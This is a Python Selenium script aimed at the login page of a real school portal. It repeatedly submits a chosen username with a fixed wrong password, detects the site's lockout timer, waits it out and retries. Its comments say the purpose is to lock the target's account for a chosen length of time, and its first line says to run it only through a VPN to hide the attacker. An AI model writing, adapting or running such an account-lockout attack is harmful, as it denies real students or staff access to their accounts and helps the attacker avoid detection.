
#this script should never be run without the use of a vpn

# 4 wrong loogins 25s cooldown
# every next login is closed for 25 seconds



import time
from time import sleep

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.actions.wheel_input import ScrollOrigin
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

browser = webdriver.Firefox()

browser.get('https://portal.lanis-system.de/?i=6110')


action = ActionChains(browser)
wait = WebDriverWait(browser, 10)  # Adjust the timeout as needed


# user data               
kurzel = str(input('e.g. "KRA" or "Finn.Dimt": ')) # Kürzel PS = offline kürzel / STK 27775
pw = "custom" # later on should be importet from csv file library
timeoutLen = int(input("1 = 30s --> 1-4 Iterationen um den Account zu sperren. / 120 = 1h e.g.: '650': "))  # 1 = 30s --> 1-4 Iterationen um den Account zu sperren. / 120 = 1h

    
def sleepFor(sleepingtime):
    for i in range(sleepingtime):
        #print("waking up in " + str(sleepingtime - i))
        time.sleep(1)
     

def login():
  browser.get('https://portal.lanis-system.de/?i=6110###')
  wait.until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
  try:
    print("trying to log in")
     
    if browser.find_elements(By.ID, 'username2') != None: 
          #print("2. Login field found")
          if browser.find_elements(By.ID, 'username2') != None:
            tfLoginName = browser.find_element(By.ID, 'username2')
            tfLoginPw = browser.find_element(By.ID, 'inputPassword')     
            #print("3. elements found ")
            action.move_to_element(to_element=tfLoginName)         
            #print("4. succesfully moved to elements")
            time.sleep(0.5)
            tfLoginName.clear()
            tfLoginName.send_keys(kurzel)
            #print("5. inserted name")
            tfLoginPw.clear()
            tfLoginPw.send_keys(pw + Keys.RETURN) 
            #print("5. inserted password")
            browser.find_element(By.ID,'tlogin').click()            
            print("LOGGED")
            
    else:
      print("2. no login window detected")  
  except:
     print("LOGIN FAILED")
    
def getDelaytime(): #returns pause time in seconds int
    try:
        print("detecting delay")
        if browser.find_elements(By.ID, 'authErrorLocktime') != None: 
                #print("DT2: looking for locktime") 
                if len(browser.find_elements(By.ID, 'authErrorLocktime')) > 0:
                     locktimeElm = browser.find_element(By.ID, 'authErrorLocktime')
                   
                     wait = WebDriverWait(browser, 10)  # Adjust the timeout as needed
                     locktimeUnit = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'span[trspan]')))  
               
                  
                     parentSpan = browser.find_element(By.CSS_SELECTOR, 'div.alert-danger')
                                   
                     #print(locktimeUnit.text) #Einheit
                     #print(parentSpan.text) #lenght
                                      
           
                     if locktimeUnit.text == "Sekunden":  
                          dt = int(locktimeElm.text)
                          #print("DT3: delaytime changed")
                          
                          
                          print("NOW SLEEPING FOR: " + str(dt) +" seconds ... ") 
                          #time.sleep(dt)
                          sleepFor(dt)                                                   
                     elif locktimeUnit.text == "Minuten":  
                          dt = int(locktimeElm.text)*60
                          #print("DT3: delaytime changed") 
                          
                          
                          print("NOW SLEEPING FOR: " + str(dt) +" seconds ... ")  
                          #time.sleep(dt)
                          sleepFor(dt)
                     elif locktimeUnit.text == "Stunden":
                          dt = int(locktimeElm.text)*60*60   
                          #print("DT3: delaytime changed")
                          
                          
                          print("NOW SLEEPING FOR: " + str(dt) +" seconds ... ")  
                          #time.sleep(dt)
                          sleepFor(dt)
                          
                     else:
                        print("DT3: failed to locate Unit or length or pause")
                     
                else:
                 print("NO DELAY DETECTED")
                 
        else:
           print("DT2: NO DELAY DETECTED") 
    except:
        print("ERROR BY TRYING TO FIND DELAY TIME") 
       
          



for x in range (0,timeoutLen):
    print("-------- Iteration: "+ str(x))
    login() 
    getDelaytime() #delays automatisch die funktion bis sie sich wieder aufruft    
    

    
input('Press ENTER to exit')    
    
  






